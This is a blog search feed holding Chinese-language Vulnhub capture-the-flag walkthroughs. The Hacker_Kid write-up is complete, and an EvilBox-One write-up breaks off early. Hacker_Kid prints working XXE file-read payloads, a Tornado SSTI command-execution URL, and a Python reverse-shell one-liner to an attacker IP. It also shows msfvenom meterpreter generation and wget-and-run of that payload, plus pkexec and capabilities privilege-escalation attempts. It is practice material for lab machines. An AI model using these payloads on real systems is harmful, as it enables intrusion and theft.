<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vulnhub靶机之Hacker_Kid</title>
      <link href="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/"/>
      <url>/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/</url>
      
        <content type="html"><![CDATA[<p>主机发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.31.0/24</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424055302241.png" alt="image-20220424055302241"></p><p>端口扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.31.188</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424055403039.png" alt="image-20220424055403039"></p><p>服务扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC -p53,80,9999 192.168.31.188</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424055624170.png" alt="image-20220424055624170"></p><p>搜索 ISC BIND 9.16.1exp，未找到</p><p>CVE-2020-8625、CVE-2021-25216</p><p>访问web80</p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424060549049.png" alt="image-20220424060549049" style="zoom:80%;"><p>点击功能点，没有可利用</p><p>查看源代码，发现page_no参数</p><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424060935622.png" alt="image-20220424060935622"></p><p>添加page_no参数访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.188/?page_no=1</span><br></pre></td></tr></table></figure><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424061051105.png" alt="image-20220424061051105" style="zoom:67%;"><p>page_no&#x3D;1和page_no&#x3D;2页面都相同，bp抓包，遍历page_no</p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424061411120.png" alt="image-20220424061411120" style="zoom:67%;"><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424061449963.png" alt="image-20220424061449963" style="zoom:80%;"><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424061554527.png" alt="image-20220424061554527" style="zoom:80%;"><p>访问page_no&#x3D;21，获取到域名 hackers.blackhat.local</p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424061700973.png" alt="image-20220424061700973" style="zoom:67%;"><p>将目标IP192.168.31.188与 hackers.blackhat.local绑定，再访问域名</p><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424062206736.png" alt="image-20220424062206736"></p><p>跟访问IP一样，dig me，dig me，dig me</p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424062541344.png" alt="image-20220424062541344" style="zoom:67%;"><p>nmap 默认扫描TCP，查看目标是否启动UDP 53 用来解析域名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -p53 192.168.31.188</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424062956607.png" alt="image-20220424062956607"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DNS区域传送漏洞</span><br><span class="line">通过指定axfr的type可以请求一个区域传输。</span><br><span class="line">向dns服务器发送一个axfr请求，如果dns服务器支持该请求，就会将所有的记录返回</span><br></pre></td></tr></table></figure><p>dig失败</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig axfr @192.168.31.188 hackers.blackhat.local</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424063323305.png" alt="image-20220424063323305"></p><p>域名去掉kackers，再dig，获取到大量域名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig axfr @192.168.31.188 blackhat.local</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424063458146.png" alt="image-20220424063458146"></p><p>将目标IP与这些域名绑定，再一个一个访问</p><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424063932926.png" alt="image-20220424063932926"></p><p>访问hackerkid.blackhat.local</p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424064102475.png" alt="image-20220424064102475" style="zoom: 67%;"><p>访问blackhat.local:9999同192.168.31.188:9999</p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424064209498.png" alt="image-20220424064209498" style="zoom:67%;"><p>看来要先注册个账号，再登录</p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424064536002.png" alt="image-20220424064536002" style="zoom:67%;"><p>对邮箱格式有检测，换个正确格式</p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424064726496.png" alt="image-20220424064726496" style="zoom:67%;"><p>抓包测一下参数</p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424064900377.png" alt="image-20220424064900377" style="zoom: 67%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xml外部实体注入</span><br><span class="line">XXE漏洞发生在应用程序解析输入的XML时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取，命令执行等攻击。</span><br></pre></td></tr></table></figure><p>构造外部实体，读取文件</p><p>只有邮箱处有错误提示</p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424065555794.png" alt="image-20220424065555794" style="zoom:67%;"><p>引入外部实体读取&#x2F;etc&#x2F;passwd文件，并在邮箱处显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY aa SYSTEM &#x27;file:///etc/passwd&#x27;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;a&lt;/name&gt;&lt;tel&gt;b&lt;/tel&gt;</span><br><span class="line">&lt;email&gt;</span><br><span class="line">&amp;aa;</span><br><span class="line">&lt;/email&gt;</span><br><span class="line">&lt;password&gt;123&lt;/password&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424065934896.png" alt="image-20220424065934896" style="zoom:80%;"><p>发现可以登录的账户，root和saket，但是目标主机没有开放22端口，不能直接ssh远程登录</p><p>查看saket &#x2F;home目录下的默认文件</p><p>.bashrc文件</p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424071542256.png" alt="image-20220424071542256" style="zoom:67%;"><p>不能读取，如果目标环境存在php，可以尝试伪协议base64编码读取</p><p>到web80页面，之前访问start显示404</p><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424071713409.png" alt="image-20220424071713409"></p><p>将html换成php，访问到主页，说明目标存在php环境</p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424071754008.png" alt="image-20220424071754008" style="zoom:67%;"><p>目录扫描也获取php文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.31.188/</span><br></pre></td></tr></table></figure><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424071956617.png" alt="image-20220424071956617" style="zoom: 67%;"><p>php为协议读取文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY aa SYSTEM &#x27;php://filter/convert.base64-encode/resource=/home/saket/.bashrc&#x27;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;a&lt;/name&gt;&lt;tel&gt;b&lt;/tel&gt;&lt;email&gt;</span><br><span class="line">&amp;aa;</span><br><span class="line">&lt;/email&gt;&lt;password&gt;123&lt;/password&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424071117171.png" alt="image-20220424071117171"></p><p>base64解密，发现账号密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=&quot;admin&quot;</span><br><span class="line">password=&quot;Saket!#$%@!!&quot;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220424071253426.png" alt="image-20220424071253426"></p><p>使用admin登录失败</p><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425054622906.png" alt="image-20220425054622906"></p><p>试试saket，登录成功</p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425054702500.png" alt="image-20220425054702500" style="zoom:80%;"><p>没有其它功能，但是提示 tell me your name告诉我你的名字，推测name传参</p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425054919359.png" alt="image-20220425054919359" style="zoom:80%;"><p>输入什么就输出什么，xss？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.188:9999/?name=&lt;script&gt;alert(/1/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425055044124.png" alt="image-20220425055044124" style="zoom:80%;"><p>的确存在反射性xss，但没办法getshell</p><p>输入什么就输出什么，SSTI模板注入？</p><p>根据前面信息搜集，9999端口web使用的是Tornado框架</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tornado是Python的Web框架，采用epoll非阻塞IO，响应快速，可处理数千并发连接，特别适用用于实时的Web服务。</span><br></pre></td></tr></table></figure><p>测试Tornado SSTI模版注入</p><p>随便输入数据，报错，发现Python版本伪3.8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.188:9999/?name=&#123;&#123;aa&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425061259080.png" alt="image-20220425061259080"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.188:9999/?name=&#123;&#123;6*6&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425060620756.png" alt="image-20220425060620756" style="zoom:80%;"><p>SSTI模板注入，实现命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.188:9999/?name=&#123;%import os%&#125;&#123;&#123;os.popen(&quot;id&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425060826154.png" alt="image-20220425060826154"></p><p>利用Python3反弹shell，报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.188:9999/?name=&#123;&#123;import os&#125;&#125;&#123;&#123;os.popen(%22python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.31.125%22,6666));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);import%20pty;pty.spawn(%22/bin/bash%22)%27%22).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425061507774.png" alt="image-20220425061507774"></p><p>利用msf木马上线</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看目标系统内核</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425063100060.png" alt="image-20220425063100060" style="zoom: 67%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">生成msf木马</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.31.125 lport=6666 -f elf &gt; mz.elf</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425062246548.png" alt="image-20220425062246548"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">配置msf</span><br><span class="line">进入msf msfconsole</span><br><span class="line">使用监听 use exploit/multi/handler</span><br><span class="line">设置TCP反弹 set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">设置监听地址 set lhost 192.168.31.125</span><br><span class="line">设置监听端口 set lport 6666</span><br><span class="line">查看配置参数 show options</span><br><span class="line">执行 exploit/run</span><br></pre></td></tr></table></figure><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425064742914.png" alt="image-20220425064742914" style="zoom:80%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python 提供web服务</span><br><span class="line">python -m SimpleHTTPServer 80 </span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425063331409.png" alt="image-20220425063331409"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">确认目标使用存在wget</span><br></pre></td></tr></table></figure><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425063452421.png" alt="image-20220425063452421" style="zoom:67%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">下载木马到目标服务器</span><br><span class="line">http://192.168.31.188:9999/?name=&#123;%import os%&#125;&#123;&#123;os.popen(&#x27;wget http://192.168.31.125/mz.elf&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425063632689.png" alt="image-20220425063632689" style="zoom:67%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">赋予执行权限</span><br><span class="line">http://192.168.31.188:9999/?name=&#123;%import os%&#125;&#123;&#123;os.popen(&#x27;chmod u+x mz.elf&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425063944313.png" alt="image-20220425063944313" style="zoom:67%;"><p>赋权失败，可能是使用了+符号，换数字赋权764</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.188:9999/?name=&#123;%import os%&#125;&#123;&#123;os.popen(&#x27;chmod 764 mz.elf&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425064132324.png" alt="image-20220425064132324" style="zoom:67%;"><p>执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.188:9999/?name=&#123;%import os%&#125;&#123;&#123;os.popen(&#x27;./mz.elf&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425064842003.png" alt="image-20220425064842003"></p><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425065132998.png" alt="image-20220425065132998"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3实现交互式shell</span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425065329538.png" alt="image-20220425065329538"></p><p>suid提权，无可利用点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425065813570.png" alt="image-20220425065813570"></p><p>查看sudo规则，需要密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425065906194.png" alt="image-20220425065906194"></p><p>查看可写入文件</p><p>&#x2F;etc&#x2F;passwd 除了文件所有者root外，都只有读取权限</p><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425070108545.png" alt="image-20220425070108545"></p><p>查看web目录，无利用点</p><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425070639852.png" alt="image-20220425070639852"></p><p>利用CVE-2021-3493提权（失败）</p><p>查看内核详细信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425070734661.png" alt="image-20220425070734661"></p><p>CVE-2021-3493 适用于Ubuntu 20.04 TLS，Ubuntu 20.04.2 LTS 应该用不了，试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">目标环境无gcc,本地编译，web空投</span><br><span class="line">gcc exploit.c -o exp</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425071310968.png" alt="image-20220425071310968"></p><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425071604100.png" alt="image-20220425071604100"></p><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425071853778.png" alt="image-20220425071853778"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">赋予执行权限，执行，提权失败</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425071945273.png" alt="image-20220425071945273"></p><p>利用CVE-2021-4034提权</p><p>查看pkexec版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkexec --version</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425072250091.png" alt="image-20220425072250091"></p><p>对于0.105版本也是不能用CVE-2021-4034提权的，但是，这次成功了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web空投CVE-2021-4034提权exp</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425072521818.png" alt="image-20220425072521818"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">赋权</span><br><span class="line">chmod u+x cve2021-4034.py</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425072725866.png" alt="image-20220425072725866"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行exp</span><br><span class="line">python3 cve2021-4034.py</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220425072819168.png" alt="image-20220425072819168"></p><p>还是得自己动手操作，pkexec 0.105版本也是可以提权的</p><p>利用capabilities提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Linux内核 2.2 之后引入了Capabilities机制用于分隔root权限.</span><br><span class="line">将之前与超级用户 root（UID=0）关联的特权细分为不同的功能组，Capabilites 作为线程（Linux 并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。</span><br><span class="line">在执行特权操作时，如果线程的有效身份不是 root，就去检查其是否具有该特权操作所对应的 capabilities，并以此为依据，决定是否可以执行特权操作。</span><br><span class="line">Capabilities有40多种权限，可以通过这些权限实现提权。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">capabilities提权参考文章</span><br><span class="line">https://www.cnblogs.com/she11s/p/13842280.html</span><br><span class="line">https://blog.csdn.net/m0_57221101/article/details/123928521</span><br></pre></td></tr></table></figure><p>查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220426060703061.png" alt="image-20220426060703061"></p><p>python2 capabilities是cap_sys_ptrace+ep不是cap_setuid+eip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">提权失败</span><br><span class="line">python2 -c &#x27;import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220426061340835.png" alt="image-20220426061340835"></p><p>通过注入到root进程提权</p><p>查看以root用户运行得进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -U root</span><br><span class="line">ps aed | grep root</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220426062357282.png" alt="image-20220426062357282"></p><p>通过脚本将后门程序注入到apache2进程中</p><p>下载脚本到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://gist.githubusercontent.com/wifisecguy/1d69839fe855c36a1dbecca66948ad56/raw/e919439010bbabed769d86303ff18ffbacdaecfd/inject.py</span><br></pre></td></tr></table></figure><p><img src="/2022/04/23/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BHacker_Kid/image-20220426064507368.png" alt="image-20220426064507368"></p><p>404，脚本已不存在，待我去找找大表哥</p><p>未完，待续。。。。。。</p><p>总结</p><p>端口扫描发现53、80、9999 —— 访问web80源代码发现page_no —— bp爆破page_no获得域名 —— DNS区域传输漏洞获得所有返回记录 —— ip域名绑定访问所有域名等到一个注册页面和登录页面 —— 利用注册页面xxe漏洞结合php伪协议读取到账号密码 —— 账号密码登录测试进入后台 —— 根据提示发现name传参进而发现SSTI模板注入 —— 利用Tornado SSTI模板注入msf上线 —— 利用CVE-2021-4034提权（利用capabilities提权，因无后门程序注入进程脚本而失败）</p><hr><p> 菜鸡打靶，大佬勿喷。如有错误，欢迎斧正。</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机之EvilBox---One</title>
      <link href="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/"/>
      <url>/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/</url>
      
        <content type="html"><![CDATA[<p>主机发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fping -gaq 192.168.31.0/24</span><br></pre></td></tr></table></figure><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422053159388.png" alt="image-20220422053159388"></p><p>端口扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.31.65</span><br></pre></td></tr></table></figure><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422053301906.png" alt="image-20220422053301906"></p><p>服务扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p22,80 192.168.31.65</span><br></pre></td></tr></table></figure><p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422053432213.png" alt="image-20220422053432213"></p><p>访问web80，Apache2默认网页</p><img src="/2022/04/21/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BEvilBox---One/image-20220422053527112.png" alt="image-20220422053527112" style="zoom: 67%;"><p>目录扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster -dir -u http://192.168.31.65/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html,bak</span><br></pre></td></tr></table></figure><img 